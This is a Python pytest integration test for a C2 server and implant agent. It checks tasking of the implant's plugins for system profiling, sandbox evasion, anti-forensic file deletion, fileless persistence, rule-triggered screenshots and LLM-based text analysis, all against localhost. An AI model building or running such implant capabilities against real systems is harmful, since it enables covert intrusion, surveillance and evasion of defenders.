import pytest
import threading
import time
import uvicorn
import requests
import os
import json
import socket
import platform
from unittest.mock import patch
from fastapi import FastAPI
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from crawler.c2.main import app as main_app
from crawler.c2.api import get_db
from crawler.c2 import models as c2_models
from crawler.implant.agent_core import CrawlerAgent
from crawler.c2.database import Base

# --- Test Configuration ---
HOST = "127.0.0.1"
PORT = 8888
C2_URL = f"http://{HOST}:{PORT}/api"
CONFIG_FILE = os.path.join(os.path.expanduser("~"), ".crawler_config.json")
C2_RULES_FILE = os.path.join("crawler", "c2", "rules.json")
TEMP_PLUGIN_PATH = os.path.join("crawler", "implant", "plugins", "temp_plugin.py")

# --- Test App and DB Setup ---
test_app = FastAPI()
test_app.include_router(main_app.router)

TEST_DB_URL = "sqlite:///./test_crawler.db"
test_engine = create_engine(TEST_DB_URL, connect_args={"check_same_thread": False})
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)

def override_get_db():
    try:
        db = TestingSessionLocal()
        yield db
    finally:
        db.close()

test_app.dependency_overrides[get_db] = override_get_db

# --- Uvicorn Server Fixture ---
class UvicornTestServer(uvicorn.Server):
    def install_signal_handlers(self): pass
    def run_in_thread(self):
        self._thread = threading.Thread(target=self.run)
        self._thread.daemon = True
        self._thread.start()
        while not self.started: time.sleep(1e-3)
    def stop(self):
        self.should_exit = True
        if self._thread and self._thread.is_alive(): self._thread.join()

@pytest.fixture(scope="module")
def c2_server_and_db():
    if os.path.exists("./test_crawler.db"): os.remove("./test_crawler.db")
    Base.metadata.create_all(bind=test_engine)
    config = uvicorn.Config(test_app, host=HOST, port=PORT, log_level="info")
    server = UvicornTestServer(config=config)
    server.run_in_thread()
    yield
    server.stop()
    if os.path.exists("./test_crawler.db"): os.remove("./test_crawler.db")

# --- Main Integration Test ---
def test_comprehensive_flow(c2_server_and_db):
    if os.path.exists(CONFIG_FILE): os.remove(CONFIG_FILE)
    if os.path.exists(C2_RULES_FILE): os.remove(C2_RULES_FILE)

    # 1. Start agent
    agent = CrawlerAgent(c2_url=C2_URL)
    agent.BEACON_INTERVAL_SECONDS = 2
    agent_thread = threading.Thread(target=agent.run, name="AgentThread")
    agent_thread.daemon = True
    agent_thread.start()
    time.sleep(3)

    # 2. Verify registration
    db = TestingSessionLocal()
    implants = db.query(c2_models.Implant).all()
    assert len(implants) == 1
    implant_id = implants[0].id
    db.close()
    print(f"\nTest: Agent registered with ID: {implant_id}")

    # 3. Test System Profiler
    print("\n--- Testing System Profiler ---")
    requests.put(f"{C2_URL}/admin/tier/{implant_id}/2")
    task_payload = {"command": "start_plugin", "args": {"plugin_name": "system_profiler"}}
    requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=task_payload)
    time.sleep(agent.BEACON_INTERVAL_SECONDS + 2)

    # 4. Test Evasion Plugin
    print("\n--- Testing Evasion Plugin ---")
    print("Test: Setting implant tier to 1 for evasion plugin.")
    response = requests.put(f"{C2_URL}/admin/tier/{implant_id}/1")
    assert response.status_code == 200

    evasion_task_payload = {"command": "start_plugin", "args": {"plugin_name": "evasion"}}
    response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=evasion_task_payload)
    assert response.status_code == 200 # Ensure task was created
    time.sleep(agent.BEACON_INTERVAL_SECONDS + 2)

    # Verify evasion results
    response = requests.get(f"{C2_URL}/admin/tasks/{implant_id}")
    assert response.status_code == 200
    tasks = response.json()

    evasion_task_found = False
    for task in tasks:
        if task.get("command") == "start_plugin" and task.get("args", {}).get("plugin_name") == "evasion":
            assert task["status"] == "completed"
            assert task["result"]
            result_data = json.loads(task["result"])
            assert isinstance(result_data, dict)
            assert len(result_data) > 0 # Expecting some indicators in a test env
            print(f"Test: Evasion plugin ran successfully, results: {result_data}")
            evasion_task_found = True
            break
    assert evasion_task_found, "Evasion plugin task was not found in the task list."

    # 5. Test Anti-Forensics Plugin (Secure Delete)
    print("\n--- Testing Anti-Forensics Plugin ---")
    file_to_delete = "test_file_to_delete.txt"
    with open(file_to_delete, "w") as f:
        f.write("This is a test file that should be securely deleted.")
    assert os.path.exists(file_to_delete)

    try:
        # Tier 1 should already be set from evasion test, but we can be explicit
        # requests.put(f"{C2_URL}/admin/tier/{implant_id}/1")

        af_task_payload = {
            "command": "start_plugin",
            "args": {"plugin_name": "anti_forensics", "file_path": file_to_delete}
        }
        response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=af_task_payload)
        assert response.status_code == 200
        time.sleep(agent.BEACON_INTERVAL_SECONDS + 2)

        # Verify secure delete results
        response = requests.get(f"{C2_URL}/admin/tasks/{implant_id}")
        assert response.status_code == 200
        tasks = response.json()

        af_task_found = False
        for task in tasks:
            if task.get("args", {}).get("plugin_name") == "anti_forensics":
                assert task["status"] == "completed"
                result_data = json.loads(task["result"])
                assert result_data["status"] == "success"
                print(f"Test: Anti-forensics plugin ran successfully: {result_data['message']}")
                af_task_found = True
                break
        assert af_task_found, "Anti-forensics plugin task was not found."
        assert not os.path.exists(file_to_delete), "Test file was not deleted."
        print("Test: Verified that the file was securely deleted.")

    finally:
        # Clean up the test file if it still exists for some reason
        if os.path.exists(file_to_delete):
            os.remove(file_to_delete)

    # 6. Test Advanced Persistence (Fileless)
    # This test can only run on Linux.
    if platform.system() == "Linux":
        print("\n--- Testing Advanced Persistence (Fileless) ---")
        persistence_task_payload = {
            "command": "start_plugin",
            "args": {"plugin_name": "persistence", "method": "fileless"}
        }
        response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=persistence_task_payload)
        assert response.status_code == 200

        # Wait for the new agent to be created and register
        print("Test: Waiting for fileless agent to register...")
        time.sleep(agent.BEACON_INTERVAL_SECONDS + 5)

        # Verify the persistence task completed successfully
        response = requests.get(f"{C2_URL}/admin/tasks/{implant_id}")
        tasks = response.json()
        persistence_task_found = False
        for task in tasks:
            if task.get("args", {}).get("plugin_name") == "persistence":
                assert task["status"] == "completed"
                result_data = json.loads(task["result"])
                assert result_data["status"] == "success"
                print(f"Test: Persistence plugin ran successfully: {result_data['message']}")
                persistence_task_found = True
                break
        assert persistence_task_found, "Persistence plugin task was not found."

        # Verify that a new implant has registered
        response = requests.get(f"{C2_URL}/admin/implants")
        assert response.status_code == 200
        all_implants = response.json()
        assert len(all_implants) == 2, "Expected two implants after fileless persistence."

        fileless_implant_id = None
        for imp in all_implants:
            if imp['hostname'].startswith('fileless-'):
                fileless_implant_id = imp['id']
                break
        assert fileless_implant_id, "Could not find the new fileless implant."
        print(f"Test: Found new fileless implant with ID: {fileless_implant_id}")

        # 7. Terminate Fileless Agent
        print("\n--- Terminating Fileless Agent ---")
        terminate_payload = {"command": "terminate", "args": {}}
        requests.post(f"{C2_URL}/admin/tasks/{fileless_implant_id}", json=terminate_payload)

    # 7. Test Rule Engine
    print("\n--- Testing Rule Engine ---")
    # Create a rule file for the C2 to use
    rule_content = [
        {
            "name": "Sandbox_Detected_Take_Screenshot",
            "condition": {"plugin": "evasion", "result_not_empty": True},
            "action": {
                "type": "task",
                "task_details": {
                    "command": "start_plugin",
                    "args": {"plugin_name": "screenshot"}
                }
            }
        }
    ]
    with open(C2_RULES_FILE, "w") as f:
        json.dump(rule_content, f)

    # Re-instantiate the C2 API to load the new rules
    # This is a hack for testing. In prod, the C2 would be restarted or have a reload endpoint.
    test_app.dependency_overrides.clear()
    test_app.dependency_overrides[get_db] = override_get_db
    from crawler.c2.api import rule_engine
    rule_engine.rules = rule_engine._load_rules()


    # Task the evasion plugin with the trigger argument
    evasion_task_payload = {
        "command": "start_plugin",
        "args": {"plugin_name": "evasion", "force_trigger": True}
    }
    response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=evasion_task_payload)
    assert response.status_code == 200
    time.sleep(agent.BEACON_INTERVAL_SECONDS + 2)

    # Verify that a new screenshot task was created
    response = requests.get(f"{C2_URL}/admin/tasks/{implant_id}")
    assert response.status_code == 200
    tasks = response.json()

    screenshot_task_found = False
    for task in tasks:
        if task.get("args", {}).get("plugin_name") == "screenshot":
            assert task["status"] in ("pending", "dispatched")
            screenshot_task_found = True
            print(f"Test: Rule engine successfully created a new screenshot task (status: {task['status']}).")
            break
    assert screenshot_task_found, "Rule engine did not create the expected screenshot task."

    # Cleanup the rules file
    if os.path.exists(C2_RULES_FILE):
        os.remove(C2_RULES_FILE)

    # 8. Test LLM Analyzer Plugin
    print("\n--- Testing LLM Analyzer Plugin ---")

    # We need a more sophisticated mock that only intercepts the LLM API call,
    # not the calls made by the test itself or the agent to the C2.
    original_requests_post = requests.post

    # Define the mock response for the LLM API
    mock_llm_response_content = json.dumps({
        "summary": "The text discusses a meeting about a 'delivery'.",
        "suspicion_level": "high",
        "keywords": ["package", "delivery", "safehouse"]
    })
    mock_api_response = {
        "choices": [{"message": {"content": mock_llm_response_content}}]
    }

    def mocked_post(url, *args, **kwargs):
        if url == "https://api.example.com/v1/chat/completions":
            # This is the call we want to mock
            mock_response = requests.Response()
            mock_response.status_code = 200
            mock_response.encoding = 'utf-8'
            mock_response._content = json.dumps(mock_api_response).encode('utf-8')
            return mock_response
        # For all other calls, use the real requests.post
        return original_requests_post(url, *args, **kwargs)

    with patch('requests.post', side_effect=mocked_post):
        llm_task_payload = {
            "command": "start_plugin",
            "args": {"plugin_name": "llm_analyzer", "text": "The package for the delivery is at the safehouse."}
        }
        response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=llm_task_payload)
        assert response.status_code == 200
        time.sleep(agent.BEACON_INTERVAL_SECONDS + 3) # A bit more time for the mocked roundtrip

        # Verify that the task completed with the mocked analysis
        response = requests.get(f"{C2_URL}/admin/tasks/{implant_id}")
        tasks = response.json()
        llm_task_found = False
        for task in tasks:
            if task.get("args", {}).get("plugin_name") == "llm_analyzer":
                assert task["status"] == "completed"
                result_data = json.loads(task["result"])
                assert result_data["status"] == "success"
                assert result_data["analysis"]["suspicion_level"] == "high"
                print("Test: LLM Analyzer plugin successfully processed mocked API response.")
                llm_task_found = True
                break
        assert llm_task_found, "LLM Analyzer task was not found."

    # 9. Terminate Original Agent
    print("\n--- Terminating Original Agent ---")
    terminate_payload = {"command": "terminate", "args": {}}
    requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=terminate_payload)
    agent_thread.join(timeout=5)
    assert not agent_thread.is_alive()
    print("Test: Comprehensive flow test finished.")
